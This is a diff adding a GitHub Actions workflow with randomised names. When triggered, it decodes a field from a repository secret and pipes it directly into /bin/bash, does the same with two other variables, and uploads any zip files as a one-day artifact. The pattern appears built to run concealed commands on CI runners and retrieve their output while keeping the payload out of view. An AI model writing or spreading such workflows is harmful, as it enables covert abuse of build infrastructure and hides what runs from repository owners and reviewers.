@@ -1,0 +1,23 @@
+name: lillianactivemqo673
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lillianactivemqo673
+        env:
+          riny63067: ${{ secrets.riny63067 }}
+        run: |
+          printf '%s' "$riny63067" | jq -r .urbpv5 | /bin/bash
+          echo $o8 | jq -r .p74531 | /bin/bash
+          echo $bdu83 | jq -r .km7 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: iPHH8gPt
+          path: "*.zip"
+          retention-days: 1
